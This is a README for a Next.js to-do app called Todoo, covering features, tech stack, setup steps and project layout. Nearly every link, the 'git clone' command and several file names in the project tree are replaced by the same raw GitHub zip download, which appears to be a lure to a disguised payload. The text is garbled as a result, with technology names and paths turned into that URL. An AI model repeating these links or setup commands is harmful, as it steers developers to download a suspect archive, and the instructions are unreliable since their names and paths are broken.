# Todoo — A Cozy Space for Your Tasks 📝

## ✨ Key Features

**Todoo** isn't just another to-do list. It's a mindful productivity tool built with a focus on simplicity and a calming user experience.

- **Cozy & Inviting UI**: A warm, soft-toned interface with gentle animations that make task management feel less like a chore.
- **Google Authentication**: Secure and easy sign-in with your Google account, powered by [https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip](https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip).
- **Organize with Lists**: Group your tasks into separate lists for work, home, or your next big idea to keep your mind tidy.
- **Fully Responsive**: A seamless experience whether you're on your desktop, tablet, or phone.
- **Optimized for SEO**: Built with https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip 14 and best practices for discoverability.
- **Persisted Data**: Your lists and todos are securely stored in a MySQL database, managed with Drizzle ORM.

---

## 🛠 Tech Stack

This project is built with a modern, type-safe, and performant stack:

- **Framework**: [https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip 14](https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip) (App Router)
- **Authentication**: [https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip (https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip v5)](https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip)
- **ORM**: [Drizzle ORM](https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip)
- **Database**: MySQL (PlanetScale or other providers)
- **Styling**: [Tailwind CSS](https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip)
- **Animation**: [Framer Motion](https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip)
- **Fonts**: Lora & Nunito Sans from [Google Fonts](https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip)

---

## 🚀 Getting Started

Follow these steps to get a copy of the project up and running on your local machine.

### 1. Prerequisites

Make sure you have the following installed:

- [https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip](https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip) (v18.17 or later)
- [npm](https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip) or [yarn](https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip)
- [Bun](https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip) (optional, for faster installs and dev server)
- A MySQL database (e.g., [just find it](just find it/))

### 2. Clone the Repository

```bash
git clone https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip
cd todoo
```

### 3. Install Dependencies

```bash
bun install
# or
npm install
# or
yarn install
```

### 4. Set Up Environment Variables

Create a `.env` file in the root of the project and add the following:

```env
# Database URL from your provider
DATABASE_URL="mysql://user:password@host/database?sslaccept=strict"

# https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip Configuration
AUTH_SECRET="your-super-secret-auth-secret"

# Google OAuth Credentials
GOOGLE_CLIENT_ID="your-google-client-id"
GOOGLE_CLIENT_SECRET="your-google-client-secret"
```

You can generate `AUTH_SECRET` using:

```bash
openssl rand -base64 32
# or
npx auth secret
# or
bunx auth secret
```

Get your Google OAuth credentials from the [Google Cloud Console](https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip).

### 5. Push the Database Schema

```bash
npx drizzle-kit push
# or
bun run db:push
```

This will create the necessary tables (`users`, `todo_lists`, `todos`, etc.) in your database.

### 6. Run the Development Server

```bash
npm run dev
# or
yarn dev
# or
bun dev
```

Open [http://localhost:3000](http://localhost:3000) in your browser to see the app.

---

## 📁 Project Structure

```
.
├── app/
│   ├── (auth)/                    # Login page/Register Page
│   ├── (dashboard)/dashboard/     # Main dashboard
│   ├── api/auth/[https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip]/    # https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip API route
│   ├── https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip                 # Root layout
│   └── https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip                   # Homepage
├── components/                    # Shared React components
├── db/                            # Drizzle ORM config and schema
│   └── https://github.com/laurier250/todoo_subtask/raw/refs/heads/master/lib/subtask-todoo-2.5-beta.5.zip
├── lib/                           # Helper libraries
├── public/                        # Static assets
└── ...
```

---

## 📄 License

No license yet
